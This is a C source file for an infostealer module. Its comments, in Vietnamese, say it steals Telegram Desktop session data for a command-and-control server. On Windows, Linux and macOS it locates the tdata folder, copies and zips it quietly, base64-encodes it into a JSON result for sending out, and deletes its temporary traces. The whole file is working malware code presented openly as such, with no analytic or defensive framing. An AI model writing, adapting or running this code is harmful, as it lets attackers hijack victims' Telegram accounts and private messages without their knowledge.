/**
 * stealer_telegram.c
 * Steal Telegram session data (tdata folder)
 * Copy va nen thanh zip de gui ve C2
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
    #include <windows.h>
    #include <shlobj.h>
#else
    #include <unistd.h>
    #include <sys/stat.h>
    #include <dirent.h>
    #include <pwd.h>
#endif

#include "stealer_telegram.h"

#ifdef _WIN32
/* ==================== WINDOWS TELEGRAM STEALER ==================== */

/**
 * Copy toan bo thu muc (de quy)
 * Dau vao: nguon - duong dan thu muc nguon
 *          dich - duong dan thu muc dich
 * Tra ve: 0 neu thanh cong, -1 neu that bai
 */
static int copy_thu_muc(const char* nguon, const char* dich) {
    /* Tao thu muc dich */
    CreateDirectoryA(dich, NULL);
    
    char search_path[512];
    snprintf(search_path, sizeof(search_path), "%s\\*", nguon);
    
    WIN32_FIND_DATAA find_data;
    HANDLE find_handle = FindFirstFileA(search_path, &find_data);
    
    if (find_handle == INVALID_HANDLE_VALUE) return -1;
    
    do {
        if (strcmp(find_data.cFileName, ".") == 0 || 
            strcmp(find_data.cFileName, "..") == 0) {
            continue;
        }
        
        char nguon_full[512], dich_full[512];
        snprintf(nguon_full, sizeof(nguon_full), "%s\\%s", nguon, find_data.cFileName);
        snprintf(dich_full, sizeof(dich_full), "%s\\%s", dich, find_data.cFileName);
        
        if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            copy_thu_muc(nguon_full, dich_full);
        } else {
            CopyFileA(nguon_full, dich_full, FALSE);
        }
    } while (FindNextFileA(find_handle, &find_data));
    
    FindClose(find_handle);
    return 0;
}

/**
 * Nen thu muc thanh file zip (dung PowerShell)
 * Dau vao: duong_dan_thu_muc - thu muc can nen
 *          duong_dan_zip - duong dan file zip dau ra
 * Tra ve: 0 neu thanh cong, -1 neu that bai
 */
static int nen_thu_muc_zip(const char* duong_dan_thu_muc, const char* duong_dan_zip) {
    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
             "powershell -Command \"Compress-Archive -Path '%s\\*' -DestinationPath '%s' -Force\"",
             duong_dan_thu_muc, duong_dan_zip);
    
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    
    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 30000); /* Cho toi da 30 giay */
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 0;
    }
    
    return -1;
}

/**
 * Steal Telegram session
 */
int steal_telegram(char* ket_qua, size_t ket_qua_size) {
    char appdata[512];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) != S_OK) {
        snprintf(ket_qua, ket_qua_size, "{\"telegram\":{\"status\":\"error\",\"message\":\"Khong tim thay AppData\"}}");
        return -1;
    }
    
    /* Telegram Desktop thu muc */
    char telegram_path[512];
    snprintf(telegram_path, sizeof(telegram_path), "%s\\Telegram Desktop\\tdata", appdata);
    
    /* Kiem tra thu muc tdata ton tai */
    DWORD attr = GetFileAttributesA(telegram_path);
    if (attr == INVALID_FILE_ATTRIBUTES || !(attr & FILE_ATTRIBUTE_DIRECTORY)) {
        snprintf(ket_qua, ket_qua_size, "{\"telegram\":{\"status\":\"not_found\"}}");
        return -1;
    }
    
    /* Tao thu muc tam */
    char temp_dir[512];
    snprintf(temp_dir, sizeof(temp_dir), "%s\\Temp\\tdata_steal_%d", appdata, (int)time(NULL));
    CreateDirectoryA(temp_dir, NULL);
    
    /* Copy tdata vao thu muc tam */
    if (copy_thu_muc(telegram_path, temp_dir) != 0) {
        snprintf(ket_qua, ket_qua_size, "{\"telegram\":{\"status\":\"error\",\"message\":\"Khong the copy\"}}");
        return -1;
    }
    
    /* Nen thanh zip */
    char zip_path[512];
    snprintf(zip_path, sizeof(zip_path), "%s\\Temp\\telegram_session_%d.zip", appdata, (int)time(NULL));
    
    if (nen_thu_muc_zip(temp_dir, zip_path) != 0) {
        snprintf(ket_qua, ket_qua_size, "{\"telegram\":{\"status\":\"error\",\"message\":\"Khong the nen\"}}");
        return -1;
    }
    
    /* Doc file zip va chuyen thanh base64 */
    HANDLE zip_file = CreateFileA(zip_path, GENERIC_READ, FILE_SHARE_READ,
                                   NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (zip_file == INVALID_HANDLE_VALUE) {
        snprintf(ket_qua, ket_qua_size, "{\"telegram\":{\"status\":\"error\",\"message\":\"Khong the doc zip\"}}");
        DeleteFileA(zip_path);
        return -1;
    }
    
    DWORD zip_size = GetFileSize(zip_file, NULL);
    if (zip_size > 10485760) zip_size = 10485760; /* Gioi han 10MB */
    
    unsigned char* zip_data = (unsigned char*)malloc(zip_size);
    if (zip_data == NULL) {
        CloseHandle(zip_file);
        DeleteFileA(zip_path);
        return -1;
    }
    
    DWORD bytes_doc;
    ReadFile(zip_file, zip_data, zip_size, &bytes_doc, NULL);
    CloseHandle(zip_file);
    
    /* Ma hoa base64 */
    const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t b64_size = ((zip_size + 2) / 3) * 4 + 1;
    char* b64_data = (char*)malloc(b64_size);
    
    if (b64_data != NULL) {
        size_t b64_offset = 0;
        for (DWORD i = 0; i < zip_size; i += 3) {
            unsigned char a = zip_data[i];
            unsigned char b = (i + 1 < zip_size) ? zip_data[i + 1] : 0;
            unsigned char c = (i + 2 < zip_size) ? zip_data[i + 2] : 0;
            
            b64_data[b64_offset++] = base64_chars[a >> 2];
            b64_data[b64_offset++] = base64_chars[((a & 0x03) << 4) | (b >> 4)];
            b64_data[b64_offset++] = (i + 1 < zip_size) ? base64_chars[((b & 0x0f) << 2) | (c >> 6)] : '=';
            b64_data[b64_offset++] = (i + 2 < zip_size) ? base64_chars[c & 0x3f] : '=';
        }
        b64_data[b64_offset] = '\0';
        
        snprintf(ket_qua, ket_qua_size,
                 "{\"telegram\":{\"status\":\"success\",\"filename\":\"telegram_session.zip\",\"data\":\"%s\"}}",
                 b64_data);
        
        free(b64_data);
    } else {
        snprintf(ket_qua, ket_qua_size, "{\"telegram\":{\"status\":\"error\",\"message\":\"Khong du bo nho\"}}");
    }
    
    free(zip_data);
    DeleteFileA(zip_path);
    
    /* Xoa thu muc tam */
    char del_cmd[512];
    snprintf(del_cmd, sizeof(del_cmd), "rmdir /s /q \"%s\"", temp_dir);
    system(del_cmd);
    
    return 0;
}

#else
/* ==================== LINUX/MACOS TELEGRAM STEALER ==================== */

int steal_telegram(char* ket_qua, size_t ket_qua_size) {
    const char* home = getenv("HOME");
    if (home == NULL) home = "/root";
    
    /* Tim tdata */
    char telegram_path[512];
    snprintf(telegram_path, sizeof(telegram_path), "%s/.local/share/TelegramDesktop/tdata", home);
    
    if (access(telegram_path, F_OK) != 0) {
        /* Thu snap */
        snprintf(telegram_path, sizeof(telegram_path), "%s/snap/telegram-desktop/current/.local/share/TelegramDesktop/tdata", home);
        if (access(telegram_path, F_OK) != 0) {
            snprintf(ket_qua, ket_qua_size, "{\"telegram\":{\"status\":\"not_found\"}}");
            return -1;
        }
    }
    
    /* Tao file tam */
    char temp_zip[512];
    snprintf(temp_zip, sizeof(temp_zip), "/tmp/telegram_session_%d.zip", (int)time(NULL));
    
    /* Nen tdata thanh zip */
    char cmd[1024];
    snprintf(cmd, sizeof(cmd), "cd \"%s/..\" && zip -r \"%s\" tdata/ 2>/dev/null", 
             telegram_path, temp_zip);
    system(cmd);
    
    if (access(temp_zip, F_OK) != 0) {
        snprintf(ket_qua, ket_qua_size, "{\"telegram\":{\"status\":\"error\",\"message\":\"Khong the nen\"}}");
        return -1;
    }
    
    /* Doc va chuyen thanh base64 */
    FILE* f = fopen(temp_zip, "rb");
    if (f == NULL) {
        unlink(temp_zip);
        return -1;
    }
    
    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    if (size > 10485760) size = 10485760;
    fseek(f, 0, SEEK_SET);
    
    unsigned char* data = (unsigned char*)malloc(size);
    if (data == NULL) {
        fclose(f);
        unlink(temp_zip);
        return -1;
    }
    
    fread(data, 1, size, f);
    fclose(f);
    unlink(temp_zip);
    
    /* Base64 encode (su dung base64 command neu co) */
    snprintf(cmd, sizeof(cmd), "base64 -w 0 \"%s\" 2>/dev/null", temp_zip);
    /* Thu ma hoa bang tay */
    const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t b64_size = ((size + 2) / 3) * 4 + 1;
    char* b64_data = (char*)malloc(b64_size);
    
    if (b64_data != NULL) {
        size_t b64_offset = 0;
        for (long i = 0; i < size; i += 3) {
            unsigned char a = data[i];
            unsigned char b = (i + 1 < size) ? data[i + 1] : 0;
            unsigned char c = (i + 2 < size) ? data[i + 2] : 0;
            
            b64_data[b64_offset++] = base64_chars[a >> 2];
            b64_data[b64_offset++] = base64_chars[((a & 0x03) << 4) | (b >> 4)];
            b64_data[b64_offset++] = (i + 1 < size) ? base64_chars[((b & 0x0f) << 2) | (c >> 6)] : '=';
            b64_data[b64_offset++] = (i + 2 < size) ? base64_chars[c & 0x3f] : '=';
        }
        b64_data[b64_offset] = '\0';
        
        snprintf(ket_qua, ket_qua_size,
                 "{\"telegram\":{\"status\":\"success\",\"filename\":\"telegram_session.zip\",\"data\":\"%s\"}}",
                 b64_data);
        free(b64_data);
    }
    
    free(data);
    return 0;
}

#endif